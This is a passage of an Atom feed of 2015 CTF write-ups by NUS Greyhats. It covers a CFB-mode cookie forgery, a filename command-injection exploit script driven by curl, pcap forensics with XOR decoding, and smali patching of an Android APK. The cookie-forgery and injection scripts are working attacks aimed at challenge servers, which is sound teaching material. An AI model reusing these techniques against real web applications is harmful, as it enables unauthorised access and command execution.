    print &amp;quot;First Block: %s&amp;quot; % first_16_byte_block

    #Plain text of first 16 byte block.
    plaintext =&amp;#39;{&amp;quot;username&amp;quot;:&amp;quot;b&amp;quot;,&amp;#39;

    encrypted_iv = int(plaintext.encode(&amp;#39;hex&amp;#39;),16) ^ int(first_16_byte_block,16)
    encrypted_iv = hex(encrypted_iv)[2:-1]
    print &amp;quot;Encrypted IV: %s&amp;quot; % encrypted_iv

    #The text I want to forge in the first block.
    forge_text = &amp;#39;{&amp;quot;admin&amp;quot;: true }&amp;#39;

    print &amp;#39;Encrypting payload...&amp;#39;

    payload = int(forge_text.encode(&amp;#39;hex&amp;#39;),16) ^ int(encrypted_iv,16)
    payload = hex(payload)[2:-1]
    payload = iv + payload
    print &amp;quot;PAYLOAD: %s&amp;quot; % payload

    cookie = {&amp;quot;auth&amp;quot;: payload.decode(&amp;quot;hex&amp;quot;)}
    r = requests.get(&amp;quot;http://52.69.244.164:51913/&amp;quot;, cookies=cookie)
    print &amp;quot;Flag: %s&amp;quot; % r.text

if __name__ == &amp;quot;__main__&amp;quot;:
    main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running the script gives us:
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/hitcon/simple/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we have our flag: &lt;strong&gt;hitcon{WoW_CFB_m0dE_5o_eAsY}&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/&quot;&gt;HITCON CTF Quals 2015 - Simple (Crypto 100)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 19, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[ASIS CTF Finals 2015 - Ultra Compression (Web 125)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/" />
  <id>https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)</id>
  <published>2015-10-12T00:00:00+08:00</published>
  <updated>2015-10-12T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;ASIS CTF 2015 Finals just took place over the weekend of 10,11 October 2015. The finals is open to all, however only qualified teams will be allowed to win the prizes. NUS Greyhats took part in it and solved a few challenges, this is our write-up for some of the challenges from ASIS CTF 2015 Finals. &lt;/p&gt;

&lt;h1 id=&quot;ultra-compression&quot;&gt;ultra compression&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt;125
&lt;strong&gt;Category:&lt;/strong&gt; Web&lt;/p&gt;

&lt;p&gt;Go &lt;a href=&quot;http://ucs.asis-ctf.ir/&quot;&gt;there&lt;/a&gt; and find the flag.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;our-solution&quot;&gt;Our solution&lt;/h1&gt;

&lt;p&gt;Here we were told to go to a webpage to find the flag. Going to the webpage shows an ultra compression service with the ability to upload files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/ucs/service.png&quot; alt=&quot;&quot; height=&quot;auto&quot; width=&quot;600px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First thing to do is to upload a legitimate file!
I chose a random image file on my machine to upload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/ucs/upload.png&quot; alt=&quot;&quot; height=&quot;300px&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By viewing all embeded javascript, we can tell that the file is sent using ajax to the uploader php script.&lt;/p&gt;

&lt;p&gt;The uploader php script is located at ‘ajax_php_file.php’. However, it seems that the file uploaded is not stored on the server.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;$(document).ready(function (e) {
$(&amp;quot;#upload&amp;quot;).on(&amp;#39;submit&amp;#39;,(function(e) {
e.preventDefault();
$(&amp;quot;#message&amp;quot;).empty();
$(&amp;#39;#loading&amp;#39;).show(1000);
$.ajax({
url: &amp;quot;ajax_php_file.php&amp;quot;, // Url to which the request is send
type: &amp;quot;POST&amp;quot;,             // Type of request to be send, called as method
data: new FormData(this), // Data sent to server, a set of key/value pairs (i.e. form fields and values)
contentType: false,       // The content type used when sending data to the server.
cache: false,             // To unable request pages to be cached
processData:false,        // To send DOMDocument or non processed data file it is set to false
success: function(data)   // A function to be called if request succeeds
{
	$(&amp;#39;#loading&amp;#39;).hide();
	$(&amp;quot;#message&amp;quot;).hide(1000);
	$(&amp;quot;#message&amp;quot;).show(500);
	$(&amp;quot;#message&amp;quot;).html(data);
}
});
}));&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using the Chrome browser’s developer tool, we can inspect the response of the ajax call.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/ucs/crypt.png&quot; alt=&quot;&quot; height=&quot;300px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the filename
&lt;code&gt;Screen Shot 2015-10-11 at 00.40.02.png&lt;/code&gt;
gets encrypted to
&lt;code&gt;ow.nnm oOsV G1ig-i1-ii cV 11Jh1J1GJ5my&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Following this finding, we can attempt to map every possible plaintext to their corresponding ciphertext, this gives us the mapping of:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;crypt = &quot;YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr&quot;&lt;/code&gt;
&lt;code&gt;plain = &quot;.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Attempting to insert a semi-colon into the filename shows that the field was injectable.
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/ucs/injection.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using a python script to automatically map payload back to their corresponding plaintext, we can then inject commands to the website.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import subprocess,sys

crypt = &amp;quot;YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr&amp;quot;
plain = &amp;quot;.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;

mapping = dict()

for x,p in enumerate(plain):
	mapping[crypt[x]] = p

inject = sys.argv[1]

out = &amp;quot;&amp;quot;

for x in inject:
	if x in mapping:
		out = out + mapping[x]
	else:
		out = out + x

print out

cmd = &amp;quot;curl &amp;#39;http://ucs.asis-ctf.ir/ajax_php_file.php&amp;#39; -H &amp;#39;Pragma: no-cache&amp;#39; -H &amp;#39;Origin: http://ucs.asis-ctf.ir&amp;#39; -H &amp;#39;Accept-Encoding: gzip, deflate&amp;#39; -H &amp;#39;Accept-Language: en-GB,en;q=0.8,en-US;q=0.6,id;q=0.4&amp;#39; -H &amp;#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&amp;#39; -H &amp;#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryes1iD3vHWDOD2gkZ&amp;#39; -H &amp;#39;Accept: */*&amp;#39; -H &amp;#39;Cache-Control: no-cache&amp;#39; -H &amp;#39;X-Requested-With: XMLHttpRequest&amp;#39; -H &amp;#39;Cookie: PHPSESSID=&amp;#39; -H &amp;#39;Connection: keep-alive&amp;#39; -H &amp;#39;Referer: http://ucs.asis-ctf.ir/&amp;#39; -H &amp;#39;DNT: 1&amp;#39; --data-binary $&amp;#39;------WebKitFormBoundaryes1iD3vHWDOD2gkZ\r\nContent-Disposition: form-data; name=\&amp;quot;file\&amp;quot;; filename=\&amp;quot;&amp;quot;+out+&amp;quot;\&amp;quot;\r\nContent-Type: image/png\r\n\r\n\r\n------WebKitFormBoundaryes1iD3vHWDOD2gkZ--\r\n&amp;#39; --compressed&amp;quot;

p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)

out = p.communicate()
print out&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Traversing to /home/asis/, we can then do a ls to see that the flag.txt is kept there. Finally, using a cat command, we can obtain the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/ucs/flag.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we have our flag: &lt;strong&gt;ASIS{72a126946e40f67a04d926dd4786ff15}&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Ultra-Compression-(Web-125)/&quot;&gt;ASIS CTF Finals 2015 - Ultra Compression (Web 125)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 12, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[ASIS CTF Finals 2015 - Big Lie (Forensics 100)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)/" />
  <id>https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)</id>
  <published>2015-10-12T00:00:00+08:00</published>
  <updated>2015-10-12T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;p&gt;ASIS CTF 2015 Finals just took place over the weekend of 10,11 October 2015. The finals is open to all, however only qualified teams will be allowed to win the prizes. NUS Greyhats took part in it and solved a few challenges, this is our write-up for some of the challenges from ASIS CTF 2015 Finals. &lt;/p&gt;

&lt;h1 id=&quot;big-lie&quot;&gt;Big Lie&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt;100
&lt;strong&gt;Category:&lt;/strong&gt; Forensics&lt;/p&gt;

&lt;p&gt;Find the &lt;a href=&quot;https://nusgreyhats.github.io/write-ups/resources/files/asis/biglie.pcap&quot;&gt;flag&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;MD5: c3037269053e61e10a2a2457051519c8&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;our-solution&quot;&gt;Our solution&lt;/h1&gt;

&lt;p&gt;We are given a pcap file and asked to find the flag. Opening up the pcap file with Wireshark, we then see many HTTP traffic conversations in it.&lt;/p&gt;

&lt;p&gt;So, the first thing to do is to filter away redundant packets. I am only looking for HTTP requests URI with the word “asis” in it.
&lt;code&gt;http.request.uri contains asis&lt;/code&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/wireshark.png&quot; alt=&quot;&quot; height=&quot;500px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see this this weird piwik.php request made to a HTTP server, and there seems to be a pastebin url in the GET request.
&lt;code&gt;http://0bin.asis.io/paste/Vyk5W274#1L8OT3oT7Xr0ryJlS5ASprAqgsQysKeebbSK90gGyQo&lt;/code&gt;
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/interesting.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at all similar conversations, I found 3 such conversations.&lt;/p&gt;

&lt;p&gt;The first one is:
&lt;code&gt;http://0bin.asis.io/paste/TINcoc0f#-krvZ7lGwZ4e2JQ8n+3dfsMBqyN6Xk6SUzY7i0JKbpo&lt;/code&gt;
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/first.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The second one is:
&lt;code&gt;http://0bin.asis.io/paste/Vyk5W274#1L8OT3oT7Xr0ryJlS5ASprAqgsQysKeebbSK90gGyQo&lt;/code&gt;
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/second.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The third one which gave us our flag is:
&lt;code&gt;http://0bin.asis.io/paste/1ThAoKv4#Zz-nHPnr0vGGg3s/7/RWD2pnZPZl580x9Y2G3IUehfc&lt;/code&gt;
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/preflag.png&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Throwing this into a text editor gives me:
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/asis/biglie/flag.png&quot; alt=&quot;&quot; height=&quot;auto&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we have our flag: &lt;strong&gt;ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)/&quot;&gt;ASIS CTF Finals 2015 - Big Lie (Forensics 100)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 12, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[CSAW CTF Qualifications 2015 - pcapin (Forensics 150)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/CSAW-CTF-Qual-2015-pcapin-(Forensics-150)/" />
  <id>https://nusgreyhats.github.io/write-ups/CSAW-CTF-Qual-2015-pcapin-(Forensics-150)</id>
  <published>2015-10-09T00:00:00+08:00</published>
  <updated>2015-10-09T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;h1&gt;pcapin&lt;/h1&gt;
&lt;p&gt;We have extracted a pcap file from a network where attackers were present. We know they were using some kind of file transfer protocol on TCP port 7179. We’re not sure what file or files were transferred and we need you to investigate. We do not believe any strong cryptography was employed.&lt;/p&gt;

&lt;p&gt;Hint: The file you are looking for is a png &lt;a href=&quot;/write-ups/resources/files/wu/csaw2015/pcapin_73c7fb6024b5e6eec22f5a7dcf2f5d82.pcap&quot;&gt;pcapin_73c7fb6024b5e6eec22f5a7dcf2f5d82.pcap&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;
This challenge has surprisingly few solves. 41 out of 1000+ registered teams. We are given a pcap file with a few request/response from a client to a server and we have to figure out what is being sent.
&lt;/p&gt;

&lt;p&gt;Analyzing the flow of the data being transferred, we can infer that two request are sent to the server and after each request, the server will send a series of packets as response.
&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/wu/csaw2015/pcapin-tcpstream.png&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;h2&gt;Request 1&lt;/h2&gt;
&lt;pre&gt;
00:08:00:00:07:31:f9:e9
&lt;/pre&gt;

&lt;h2&gt;Request 2&lt;/h2&gt;
&lt;pre&gt;
00:3a:00:00:15:02:f9:e9:8f:95:88:9e:c7:89:87:9e:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9:e9:f9
&lt;/pre&gt;
&lt;p&gt;
We see that request 1 is 8 bytes in length and coincidentally, there is also 00:08 in the data. Looking at the second request, we also see 00:3a in the same place. 3a is 58 in decimal and this correspond to the size of the request. Looking at the responses, we are also able to divide it into &quot;packets&quot; based on the size in the first 2 bytes. Another thing to note is that there appears to be an overwhelming amount of &quot;f9:e9&quot; in both the requests and in the first set of response from the server. This would infer that &quot;f9:e9&quot; is either the padding or the key since when XORed with null, it remains the same. We are able to verify that that is true by xoring with each of the packets in the first set of responses.
&lt;/p&gt;

&lt;pre&gt;
document.pdf
sample.tif
outfile.dat
grey_no_firewall.zip
flag.png
resume.pdf
god.pcapng
malware.exe
&lt;/pre&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;for cipher in response1:
	key = request1.split(&amp;quot;:&amp;quot;)
	key = key[6:]
	
	cipher = cipher.split(&amp;quot;:&amp;quot;)
	cipher = cipher[13:]

	ans = &amp;quot;&amp;quot;
	for i,c in enumerate(cipher):
		xor = (hexor(key[i % len(key)],c))
		ans += xor
	print ans[6:-4].decode(&amp;quot;hex&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;
In the output, we noticed that there was a file named &quot;flag.png&quot;. We can also see that the last 50 bytes of request 2 is identical to the section of cipher text that gets translated into &quot;flag.png&quot;.
&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/wu/csaw2015/pcapin-flagcipher.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;
Thinking that we solved it, we processed all packets in response 2 the same way as how we solve response 1 but it resulted in gibberish data. Since we know that we need a png file, we then tried to &quot;guess&quot; the key by taking the data segment of the first packet in the response and xoring the first 8 bytes with the png header. Getting a series of &quot;3f:50&quot; back, we used it as a key but it again resulted in gibberish data. Undaunted, we again look deeper into the responses and noticed that they all have the same size. However, it is unlikely that the original data can be divided that nicely so it would probably be padded at the end. Looking at the last packet of response 2, we can see a series of &quot;6c:4c&quot; but that is also not the correct key. We then look for differences between packets in response 1 versus those in response 2 and noticed something unusual. In response 1, byte 3,4 are both &quot;00:00&quot; in all instances but in response 2, they are all different. 
&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/wu/csaw2015/pcapin-byte34.png&quot; width=&quot;30%&quot; height=&quot;30%&quot; /&gt;&lt;/p&gt;
&lt;p&gt;
Looking deeper, we realize that f9+45+1 = 13f -&amp;gt; 3f and e9+67=150 -&amp;gt; 50. Again verifying that with the last packet, f9+72+1=16c -&amp;gt; 6c and e9+63=14c -&amp;gt; 4c. Finally, using this new information, we found the flag!.
&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/write-ups/resources/images/wu/csaw2015/pcapin-flag.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;A s1mp!3_n37w0rk_c4@113nge that was not simple at all!&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;for cipher in response2:
    cipher = cipher.split(&amp;quot;:&amp;quot;)

    key = [&amp;quot;f9&amp;quot;,&amp;quot;e9&amp;quot;]
    k1 = int(key[0],16)
    k2 = int(key[1],16)

    a1 = int(cipher[2],16)
    a2 = int(cipher[3],16)

    k1 = k1+a1+1
    k2 = k2+a2

    key = [hex(k2)[-2:],hex(k1)[-2:]]

    cipher = cipher[12:]

    ans = &amp;quot;&amp;quot;
    for i,c in enumerate(cipher):
        xor = (hexor(key[i % len(key)],c))
        ans += xor

    ans2 += ans

import binascii
hb=binascii.a2b_hex(ans2)
file = open(&amp;quot;flag.png&amp;quot;,&amp;quot;wb&amp;quot;)
file.write(hb)
file.close()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Click &lt;a href=&quot;/write-ups/resources/files/wu/csaw2015/pcapin_data_raw.txt&quot;&gt;here&lt;/a&gt; for the raw data found in the pcap.&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/CSAW-CTF-Qual-2015-pcapin-(Forensics-150)/&quot;&gt;CSAW CTF Qualifications 2015 - pcapin (Forensics 150)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 09, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[TrendMicroCTF - VirusClicker (Offensive 200)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/TrendMicroCTF-VirusClicker-(Offensive-200)/" />
  <id>https://nusgreyhats.github.io/write-ups/TrendMicroCTF-VirusClicker-(Offensive-200)</id>
  <published>2015-10-08T00:00:00+08:00</published>
  <updated>2015-10-08T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;h2 id=&quot;click-button-attack-virus&quot;&gt;Click Button! Attack Virus!&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Points:&lt;/em&gt;&lt;/strong&gt; 200 &lt;strong&gt;&lt;em&gt;Category:&lt;/em&gt;&lt;/strong&gt; Offensive &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Description:&lt;/em&gt;&lt;/strong&gt;
&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/resources/files/VirusClicker.apk&quot;&gt;VirusClicker&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;MD5: 1a0462c2bc27bdd3a5045036c36c3e31&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;# Solution&lt;/p&gt;

&lt;p&gt;After downloading the APK and installing it on my BlueStacks Emulator, you see this screen that requires us to press on the button for 10’000’000 times…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/virusclicker.png&quot; alt=&quot;&quot; height=&quot;300px&quot; width=&quot;200px&quot; /&gt;
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/10mclicks.png&quot; alt=&quot;&quot; height=&quot;300px&quot; width=&quot;200px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We first use apktool to decompile the apk into the respective smali code. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/apkdecode.png&quot; alt=&quot;&quot; width=&quot;auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The part of the code that we’re interested in is the onTouchEvent that is called on every press.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-smali&quot; data-lang=&quot;smali&quot;&gt;.method public onTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 4
    const/4 v3, 0x1
    invoke-virtual {p1}, Landroid/view/MotionEvent;-&amp;gt;getAction()I
    move-result v0
    packed-switch v0, :pswitch_data_0
    :cond_0
    :goto_0
    return v3
    :pswitch_0
    iput-boolean v3, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;h:Z
    goto :goto_0
    :pswitch_1
    const/4 v0, 0x0
    iput-boolean v0, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;h:Z
    iget v0, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    add-int/lit8 v0, v0, 0x1
    iput v0, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    invoke-static {}, Lcom/tm/ctf/clicker/a/a;-&amp;gt;b()V
    const/16 v0, 0xeb9
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const/16 v0, 0x2717
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const v0, 0xe767
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const v0, 0x186a3
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const v0, 0x78e75
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const v0, 0xf4243
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-eq v0, v1, :cond_1
    const v0, 0x98967f
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-ne v0, v1, :cond_2
    :cond_1
    new-instance v0, Landroid/content/Intent;
    const-string v1, &amp;quot;com.tm.ctf.clicker.SCORE&amp;quot;
    invoke-direct {v0, v1}, Landroid/content/Intent;-&amp;gt;&amp;lt;init&amp;gt;(Ljava/lang/String;)V
    const-string v1, &amp;quot;SCORE&amp;quot;
    iget v2, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;-&amp;gt;putExtra(Ljava/lang/String;I)Landroid/content/Intent;
    iget-object v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;a:Landroid/content/Context;
    invoke-virtual {v1, v0}, Landroid/content/Context;-&amp;gt;sendBroadcast(Landroid/content/Intent;)V
    :cond_2
    const v0, 0x989680
    iget v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;g:I
    if-gt v0, v1, :cond_0
    invoke-static {}, Landroid/os/Message;-&amp;gt;obtain()Landroid/os/Message;
    move-result-object v0
    new-instance v1, Ljava/lang/StringBuilder;
    iget-object v2, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;q:Ljava/lang/String;
    invoke-static {v2}, Ljava/lang/String;-&amp;gt;valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-&amp;gt;&amp;lt;init&amp;gt;(Ljava/lang/String;)V
    const-string v2, &amp;quot;Jh&amp;quot;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;-&amp;gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;-&amp;gt;toString()Ljava/lang/String;
    move-result-object v1
    iput-object v1, v0, Landroid/os/Message;-&amp;gt;obj:Ljava/lang/Object;
    iget-object v1, p0, Lcom/tm/ctf/clicker/activity/c;-&amp;gt;b:Landroid/os/Handler;
    invoke-virtual {v1, v0}, Landroid/os/Handler;-&amp;gt;sendMessage(Landroid/os/Message;)Z
    goto :goto_0
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
	.end method&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;From the code, we can see that something will happen after we hit 0x989680 (10’000’000) clicks.
Also, it seems that there are “mini-checkpoints” that you’re suppose to hit at 0xeb9, 0x2717, 0xe767, 0x186a3, 0x78e75, 0xf4243, 0x98967f. What I am going to do is to patch the APK such that upon the first touch event, I am going to invoke all the necessary instructions to show me the flag.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-smali&quot; data-lang=&quot;smali&quot;&gt;const v0, 0x989680
    const v1, 0x989680
    if-gt v0, v1, :cond_0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The same for all the “mini-checkpoints”. 
We then use apktool to recompile the smali code back to .apk and then use jarsigner to sign it with a key we generated.
&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/apksign.png&quot; alt=&quot;&quot; /&gt;
We then install the “patched” apk onto the BlueStacks emulator and tada! We got the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nusgreyhats.github.io/write-ups/resources/images/virusflag.png&quot; alt=&quot;&quot; width=&quot;200px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;TMCTF{Congrats_10MClicks}&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;


    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/TrendMicroCTF-VirusClicker-(Offensive-200)/&quot;&gt;TrendMicroCTF - VirusClicker (Offensive 200)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 08, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[TrendMicroCTF - 500 Captchas! (Misc 300)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/TrendMicroCTF-500-Captchas!-(Misc-300)/" />
  <id>https://nusgreyhats.github.io/write-ups/TrendMicroCTF-500-Captchas!-(Misc-300)</id>
  <published>2015-10-08T00:00:00+08:00</published>
  <updated>2015-10-08T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;h1&gt;Welcome to Captcha Challenge!&lt;/h1&gt;
